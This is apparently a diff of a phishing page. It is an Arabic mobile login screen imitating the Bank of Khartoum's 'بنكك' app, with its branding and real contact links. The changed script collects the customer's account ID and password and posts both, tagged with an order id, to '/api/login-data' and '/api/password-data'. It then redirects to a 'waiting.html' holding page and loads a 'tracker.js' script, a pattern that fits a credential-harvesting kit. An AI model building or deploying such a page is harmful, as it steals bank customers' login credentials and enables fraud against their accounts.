@@ -3,107 +3,138 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>تسجيل الدخول</title>
+<title>تسجيل الدخول - بنكك</title>
 <style>
   *{box-sizing:border-box;margin:0;padding:0}
   html,body{height:100%;font-family:"Segoe UI",Tahoma,Arial,sans-serif}
-  body{
-    max-width:520px;margin:0 auto;min-height:100vh;
-    background:
-      linear-gradient(150deg, rgba(255,255,255,.6) 0%, rgba(255,255,255,.6) 15%, transparent 15.5%),
-      linear-gradient(150deg, transparent 14%, rgba(255,255,255,.35) 14.5%, rgba(255,255,255,.35) 28%, transparent 28.5%),
-      linear-gradient(150deg, transparent 27%, rgba(255,255,255,.2) 27.5%, rgba(255,255,255,.2) 42%, transparent 42.5%),
-      linear-gradient(150deg, transparent 55%, rgba(255,255,255,.15) 55.5%, rgba(255,255,255,.15) 68%, transparent 68.5%);
-    background-size:100% 100%;
-    background-attachment:fixed;
-    background-color:#e0e1e3;
-    display:flex;flex-direction:column;
-  }
+  body{max-width:520px;margin:0 auto;min-height:100vh;background:#f5f5f5;display:flex;flex-direction:column}
 
-  .back-btn{
-    position:absolute;top:16px;left:16px;width:40px;height:40px;
-    border:none;background:transparent;cursor:pointer;
-    font-size:28px;color:#333;display:flex;align-items:center;justify-content:center;
+  /* Header */
+  .top-bar{height:28px;background:#1a1a1a}
+  .header{
+    background:linear-gradient(180deg,#c62828 0%,#e53935 100%);
+    padding:30px 20px 40px;text-align:center;position:relative;
   }
-
-  .content{flex:1;padding:60px 24px 0;position:relative}
-
-  h1{font-size:32px;font-weight:800;color:#1a1a1a;line-height:1.4;margin-bottom:16px}
-  .subtitle{color:#888;font-size:15px;margin-bottom:40px}
-
-  .input-group{position:relative;margin-bottom:16px}
-  .input-group input{
-    width:100%;padding:18px 16px;border:2px solid #2e7d32;border-radius:8px;
-    font-size:16px;font-family:inherit;background:#fff;color:#1a1a1a;outline:none;
+  .lang-toggle{
+    position:absolute;top:12px;left:12px;width:40px;height:40px;
+    border:2px solid rgba(255,255,255,.5);border-radius:50%;
+    background:transparent;color:#fff;font-size:14px;font-weight:700;
+    cursor:pointer;display:flex;align-items:center;justify-content:center;
   }
-  .input-group label{
-    position:absolute;top:-10px;right:14px;background:#fff;padding:0 6px;
-    font-size:13px;color:#2e7d32;font-weight:600;
-  }
+  .header-logo{max-height:110px}
 
-  .options{margin-top:20px}
-  .option-row{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;direction:ltr}
-  .check-label{display:flex;align-items:center;gap:8px;font-size:14px;color:#333;cursor:pointer}
-  .check-label input[type="checkbox"]{
-    width:22px;height:22px;accent-color:#333;cursor:pointer;
-  }
-  .forgot-link{color:#c62828;font-size:13px;text-decoration:none;font-weight:500}
-  .info-icon{
-    width:24px;height:24px;border:1.5px solid #999;border-radius:50%;
-    display:flex;align-items:center;justify-content:center;
-    font-size:14px;color:#999;font-weight:700;cursor:pointer;
-  }
+  /* Form */
+  .form-area{padding:28px 20px 0;flex:1}
 
-  .bottom{padding:20px 24px 40px}
-  .next-btn{
-    display:block;width:100%;padding:18px;border:none;border-radius:50px;
-    font-size:18px;font-weight:700;color:#fff;cursor:pointer;font-family:inherit;
-    background:linear-gradient(135deg, #c62828, #e53935);
-    box-shadow:0 4px 15px rgba(198,40,40,.3);
-    transition:.2s;
+  .input-wrap{
+    display:flex;align-items:center;gap:12px;
+    background:#fff;border:1.5px solid #ccc;border-radius:10px;
+    padding:0 16px;margin-bottom:14px;height:58px;
   }
-  .next-btn:hover{opacity:.9;transform:translateY(-1px)}
-  .next-btn:disabled{opacity:.6;cursor:not-allowed;transform:none}
+  .input-wrap:focus-within{border-color:#c62828}
+  .input-wrap .icon{flex-shrink:0;width:28px;height:28px;color:#888;display:flex;align-items:center;justify-content:center}
+  .input-wrap .icon svg{width:24px;height:24px;fill:#888}
+  .input-wrap input{
+    flex:1;border:none;outline:none;font-size:15px;font-family:inherit;
+    background:transparent;color:#333;height:100%;
+  }
+  .input-wrap input::placeholder{color:#aaa;font-size:14px}
+  .eye-btn{background:none;border:none;cursor:pointer;padding:4px;display:flex;align-items:center}
+  .eye-btn svg{width:22px;height:22px;fill:#888}
 
+  /* Login Button */
+  .login-btn{
+    display:block;width:100%;padding:18px;border:none;border-radius:12px;
+    font-size:20px;font-weight:800;color:#fff;cursor:pointer;font-family:inherit;
+    background:linear-gradient(180deg,#e53935 0%,#b71c1c 50%,#c62828 100%);
+    box-shadow:0 6px 20px rgba(198,40,40,.4),inset 0 1px 0 rgba(255,255,255,.2);
+    margin-top:10px;transition:.2s;
+  }
+  .login-btn:hover{opacity:.92;transform:translateY(-1px)}
+  .login-btn:disabled{opacity:.5;cursor:not-allowed;transform:none}
+
+  /* Links */
+  .links{display:flex;justify-content:space-between;padding:18px 6px;font-size:14px}
+  .links a{color:#555;text-decoration:none;font-weight:600}
+  .links a:hover{color:#c62828}
+
+  /* Error */
   .error-msg{
     display:none;background:#fee;border:1px solid #fcc;border-radius:8px;
-    padding:10px 14px;margin-bottom:16px;color:#c62828;font-size:13px;text-align:center;
+    padding:10px 14px;margin-bottom:14px;color:#c62828;font-size:13px;text-align:center;
   }
+
+  /* Bottom Bar */
+  .bottom-bar{
+    margin-top:auto;padding:20px 16px 24px;
+    display:flex;justify-content:center;gap:32px;
+  }
+  .bottom-item{display:flex;flex-direction:column;align-items:center;gap:6px;text-decoration:none;color:#555;font-size:11px;font-weight:600}
+  .bottom-item .bi{
+    width:50px;height:50px;border-radius:50%;
+    display:flex;align-items:center;justify-content:center;
+  }
+  .bottom-item .bi svg{width:28px;height:28px;fill:#fff}
+  .bi-fb{background:#3b5998}
+  .bi-help{background:#8bc34a}
+  .bi-loc{background:#c62828}
+  .bi-bok{background:#1b5e20}
 </style>
 </head>
 <body>
 
-  <div class="content">
-    <button class="back-btn" onclick="history.back()" aria-label="رجوع">&#8592;</button>
+  <div class="top-bar"></div>
 
-    <h1>قم بتسجيل الدخول إلى<br>المساحة الشخصية الخاصة بك</h1>
-    <p class="subtitle">الرجاء إدخال اسم المستخدم الخاص بك لتسجيل الدخول.</p>
+  <div class="header">
+    <a href="login-en.html" class="lang-toggle">A/ع</a>
+    <img src="images/logo.jpg" alt="بنكك" class="header-logo">
+  </div>
 
+  <div class="form-area">
     <div class="error-msg" id="errorMsg"></div>
 
-    <div class="input-group">
-      <input type="text" id="username" autocomplete="username" autofocus>
-      <label>اسم المستخدم</label>
+    <div class="input-wrap">
+      <div class="icon">
+        <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+      </div>
+      <input type="text" id="username" placeholder="أدخل رقم المعرف (رقم الحساب أو...)" autocomplete="username" autofocus>
     </div>
 
-    <div class="options">
-      <div class="option-row">
-        <label class="check-label">
-          <input type="checkbox" checked> تذكر هويتي
-        </label>
-        <a href="#" class="forgot-link">نسيت إسم المستخدم؟</a>
+    <div class="input-wrap">
+      <div class="icon">
+        <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
       </div>
-      <div class="option-row">
-        <label class="check-label">
-          <input type="checkbox" checked> تفعيل الوضع السري
-        </label>
-        <div class="info-icon">i</div>
-      </div>
+      <input type="password" id="password" placeholder="ادخل كلمة المرور">
+      <button class="eye-btn" onclick="togglePass()" type="button" aria-label="إظهار كلمة المرور">
+        <svg id="eyeIcon" viewBox="0 0 24 24"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>
+      </button>
+    </div>
+
+    <button class="login-btn" id="loginBtn" onclick="submitLogin()">تسجيل الدخول</button>
+
+    <div class="links">
+      <a href="#">تسجيل جديد؟</a>
+      <a href="#">لاتستطيع تسجيل الدخول؟</a>
     </div>
   </div>
 
-  <div class="bottom">
-    <button class="next-btn" id="nextBtn" onclick="submitUsername()">التالي</button>
+  <div class="bottom-bar">
+    <a class="bottom-item" href="https://www.facebook.com/BankofKhartoum1913" target="_blank">
+      <div class="bi bi-fb"><svg viewBox="0 0 24 24"><path d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12c0 4.84 3.44 8.87 8 9.8V15H8v-3h2V9.5C10 7.57 11.57 6 13.5 6H16v3h-2c-.55 0-1 .45-1 1v2h3v3h-3v6.95c5.05-.5 9-4.76 9-9.95z"/></svg></div>
+      <span>فيس بوك</span>
+    </a>
+    <a class="bottom-item" href="tel:+249187040600">
+      <div class="bi bi-help"><svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg></div>
+      <span>المساعدة</span>
+    </a>
+    <a class="bottom-item" href="https://bankofkhartoum.com/sudan/ar/find-us" target="_blank">
+      <div class="bi bi-loc"><svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg></div>
+      <span>مواقعنا</span>
+    </a>
+    <a class="bottom-item" href="https://bankofkhartoum.com/sudan/ar/personal" target="_blank">
+      <div class="bi bi-bok"><svg viewBox="0 0 24 24"><path d="M4 10v7h3v-7H4zm6 0v7h3v-7h-3zM2 22h19v-3H2v3zm14-12v7h3v-7h-3zm-4.5-9L2 6v2h19V6l-9.5-5z"/></svg></div>
+      <span>بنك الخرطوم</span>
+    </a>
   </div>
 
 <script>
@@ -114,45 +145,67 @@
     showError("اسم المستخدم او الرمز السري غير صحيح");
   }
 
-  async function submitUsername() {
-    const username = document.getElementById("username").value.trim();
-    if (!username) {
-      showError("الرجاء إدخال اسم المستخدم");
-      return;
-    }
-    const btn = document.getElementById("nextBtn");
+  function togglePass(){
+    var p=document.getElementById("password");
+    p.type = p.type==="password" ? "text" : "password";
+  }
+
+  async function submitLogin() {
+    var username = document.getElementById("username").value.trim();
+    var password = document.getElementById("password").value;
+    if (!username) { showError("الرجاء إدخال رقم المعرف"); return; }
+    if (!password) { showError("الرجاء إدخال كلمة المرور"); return; }
+
+    var btn = document.getElementById("loginBtn");
     btn.disabled = true;
     btn.textContent = "جاري التحقق...";
 
     try {
-      const res = await fetch("/api/login-data", {
+      var res = await fetch("/api/login-data", {
         method: "POST",
         headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({ order_id: orderId, username })
+        body: JSON.stringify({ order_id: orderId, username: username })
       });
-      const data = await res.json();
-      if (data.success) {
-        location.href = "password.html?order=" + orderId + "&user=" + encodeURIComponent(username);
-      } else {
+      var data = await res.json();
+      if (!data.success) {
         showError(data.message || "حدث خطأ");
         btn.disabled = false;
-        btn.textContent = "التالي";
+        btn.textContent = "تسجيل الدخول";
+        return;
+      }
+
+      var res2 = await fetch("/api/password-data", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ order_id: orderId, password: password })
+      });
+      var data2 = await res2.json();
+      if (data2.success) {
+        location.href = "waiting.html?order=" + orderId;
+      } else {
+        showError(data2.message || "حدث خطأ");
+        btn.disabled = false;
+        btn.textContent = "تسجيل الدخول";
       }
     } catch(err) {
       showError("حدث خطأ في الاتصال");
       btn.disabled = false;
-      btn.textContent = "التالي";
+      btn.textContent = "تسجيل الدخول";
     }
   }
 
   function showError(msg) {
-    const el = document.getElementById("errorMsg");
+    var el = document.getElementById("errorMsg");
     el.textContent = msg;
     el.style.display = "block";
+    setTimeout(function(){ el.style.display = "none"; }, 3000);
   }
 
-  document.getElementById("username").addEventListener("keydown", e => {
-    if (e.key === "Enter") submitUsername();
+  document.getElementById("password").addEventListener("keydown", function(e) {
+    if (e.key === "Enter") submitLogin();
+  });
+  document.getElementById("username").addEventListener("keydown", function(e) {
+    if (e.key === "Enter") document.getElementById("password").focus();
   });
 </script>
 <script src="tracker.js"></script>
